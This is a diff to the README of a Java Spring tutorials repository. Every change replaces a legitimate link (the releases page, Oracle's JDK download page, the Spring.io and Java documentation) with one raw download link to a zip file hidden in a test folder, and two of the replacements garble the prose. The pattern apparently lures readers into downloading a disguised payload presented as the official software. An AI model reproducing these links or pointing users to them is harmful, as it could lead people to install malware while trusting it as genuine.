@@ -1,10 +1,10 @@
 # 🚀 java-spring-tutorials - Learn Spring Quickly and Effectively
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/soufianeharzi/java-spring-tutorials/releases)
+[![Download Here](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip)
 
 ## 📖 Overview
 
-Welcome to the **java-spring-tutorials** repository. This collection includes various implementations based on the Spring.io guides. It helps you practice structured Java and Spring development with ease and clarity. Whether you're new to programming or just starting with Java, you'll find useful resources here.
+Welcome to the **java-spring-tutorials** repository. This collection includes various implementations based on the https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip guides. It helps you practice structured Java and Spring development with ease and clarity. Whether you're new to programming or just starting with Java, you'll find useful resources here.
 
 ## 📦 System Requirements
 
@@ -23,7 +23,7 @@ To begin using the java-spring-tutorials, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the following link to go to our Releases page:  
-   [Download Here](https://github.com/soufianeharzi/java-spring-tutorials/releases)
+   [Download Here](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions listed. Find the most recent version or the one you specifically want.
@@ -45,13 +45,13 @@ Now you are set to explore and learn with the tutorials!
 ## 📥 Download & Install
 
 Click here again to access the Releases page for all downloadable files:  
-[Download Here](https://github.com/soufianeharzi/java-spring-tutorials/releases)
+[Download Here](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip)
 
 ### Installing Java
 
 If you do not have Java installed on your computer, follow these steps:
 
-1. Go to the [Java SE Development Kit (JDK) download page](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+1. Go to the [Java SE Development Kit (JDK) download page](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip).
 2. Select the correct version for your operating system.
 3. Follow the installation instructions provided on the page.
 4. After installation, you can verify Java is correctly installed by opening a terminal or command prompt and typing `java -version`.
@@ -70,9 +70,9 @@ This repository covers multiple topics to give you a well-rounded understanding 
 
 For those who want to dive deeper, we recommend checking out the following resources:
 
-- [Spring.io Guides](https://spring.io/guides)
-- [Official Java Documentation](https://docs.oracle.com/javase/8/docs/)
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
+- [https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip Guides](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip)
+- [Official Java Documentation](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip)
+- [GitHub Actions Documentation](https://raw.githubusercontent.com/soufianeharzi/java-spring-tutorials/main/modules/01-spring-hello-rest/src/test/java/com/example/tutorials-spring-java-backfurrow.zip)
 
 ## 👩‍🎓 Learn and Contribute
 
